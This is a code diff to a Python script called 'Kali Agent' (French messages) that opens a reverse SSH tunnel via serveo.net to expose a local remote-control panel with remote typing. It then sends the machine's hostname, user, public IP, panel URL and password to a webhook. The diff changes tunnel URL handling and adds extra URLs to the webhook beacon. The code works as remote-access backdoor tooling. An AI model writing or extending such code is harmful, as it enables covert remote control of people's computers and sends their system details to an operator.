@@ -411,48 +411,56 @@ def on_remote_type(d): remote_type(d["text"])
 
 # ===== TUNNEL (serveo.net) =====
 def start_tunnel():
-    global tunnel_url
-    tunnel_url = None
+    global tunnel_url, tunnel_urls
+    tunnel_urls = []
     try:
         cmd = ["ssh", "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
                "-o", "ServerAliveInterval=30", "-R", "80:localhost:5000", "serveo.net"]
         proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
 
         def reader():
-            global tunnel_url
+            global tunnel_url, tunnel_urls
             for line in iter(proc.stdout.readline, ""):
                 line = line.strip()
                 if line: print("[serveo]", line)
-                m = re.search(r'https?://[a-z0-9-]+\.serveo\.net', line)
-                if m:
-                    tunnel_url = m.group()
-                    print(f"[+] Serveo URL: {tunnel_url}")
-                    return
+                for m in re.finditer(r'https?://[a-z0-9-]+\.serveo\.net', line):
+                    u = m.group()
+                    if u not in tunnel_urls: tunnel_urls.append(u)
+                    if "console.serveo.net" not in u and not tunnel_url:
+                        tunnel_url = u
+                        print(f"[+] Serveo URL: {tunnel_url}")
+                        return
 
         t = threading.Thread(target=reader, daemon=True)
         t.start()
         for _ in range(30):
             if tunnel_url: break
             time.sleep(0.5)
+        if not tunnel_url and tunnel_urls:
+            tunnel_url = tunnel_urls[0]
         return tunnel_url
     except Exception as e:
         print(f"[-] Tunnel error: {e}")
         return None
 
-def send_webhook(url):
+def send_webhook(url, extra_urls=None):
     try:
-        host = os.popen("hostname").read().strip()
+        host = subprocess.run(["hostname"], capture_output=True, text=True, timeout=5).stdout.strip()
         user = os.getenv("USER", "unknown")
         ip = requests.get("https://api.ipify.org", timeout=5).text.strip()
+        fields = [
+            {"name": "🔗 Panel", "value": f"{url}?auth={PASSWORD}", "inline": False},
+            {"name": "🖥 Hostname", "value": host, "inline": True},
+            {"name": "👤 User", "value": user, "inline": True},
+            {"name": "🌍 IP", "value": ip, "inline": True},
+            {"name": "🔑 Password", "value": f"`{PASSWORD}`", "inline": True}
+        ]
+        if extra_urls:
+            others = "\n".join(f"• {u}?auth={PASSWORD}" for u in extra_urls if u != url)
+            if others: fields.append({"name": "🔄 Autres URLs", "value": others, "inline": False})
         requests.post(WEBHOOK_URL, json={"embeds": [{
             "title": "🚀 Kali Agent Prêt", "color": 5763719,
-            "fields": [
-                {"name": "🔗 Panel", "value": f"{url}?auth={PASSWORD}", "inline": False},
-                {"name": "🖥 Hostname", "value": host, "inline": True},
-                {"name": "👤 User", "value": user, "inline": True},
-                {"name": "🌍 IP", "value": ip, "inline": True},
-                {"name": "🔑 Password", "value": f"`{PASSWORD}`", "inline": True}
-            ],
+            "fields": fields,
             "footer": {"text": datetime.now().strftime("%d/%m/%Y %H:%M:%S")}
         }]}, timeout=10)
         print("[+] Webhook envoyé")
@@ -464,7 +472,7 @@ if __name__ == "__main__":
     url = start_tunnel()
     if url:
         print(f"[+] URL: {url}?auth={PASSWORD}")
-        send_webhook(url)
+        send_webhook(url, tunnel_urls)
     else:
         print(f"[-] Local: http://127.0.0.1:{PORT}")
     socketio.run(app, host="0.0.0.0", port=PORT, debug=False, allow_unsafe_werkzeug=True)
